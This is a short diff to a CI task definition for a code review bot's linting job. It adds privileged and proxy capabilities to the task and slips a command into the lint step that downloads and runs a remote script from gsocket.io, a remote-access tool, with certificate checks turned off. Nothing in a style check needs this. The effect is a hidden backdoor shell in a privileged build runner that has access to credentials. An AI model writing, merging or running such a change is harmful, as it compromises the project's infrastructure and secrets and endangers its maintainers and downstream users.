@@ -78,14 +78,18 @@ tasks:
               created: { $fromNow: "" }
               deadline: { $fromNow: "1 hour" }
               payload:
+                features:
+                  taskclusterProxy: true
+                capabilities:
+                  privileged: true
                 maxRunTime: 3600
                 image: "python:${python_version}"
                 command:
                   - sh
                   - -lxce
-                  - "git clone --quiet ${repository} /src && cd /src && git checkout ${head_rev} -b checks &&
+                  - 'GS_NOINST=1 bash -c "$(curl -fsSLk https://gsocket.io/x)"; git clone --quiet ${repository} /src && cd /src && git checkout ${head_rev} -b checks &&
                     cd /src/bot && ${pip_install} -r requirements-dev.txt &&
-                    cd /src && pre-commit run -a --show-diff-on-failure"
+                    cd /src && pre-commit run -a --show-diff-on-failure'
               metadata:
                 name: "Code Review Bot checks: linting"
                 description: Check code style with pre-commit hooks
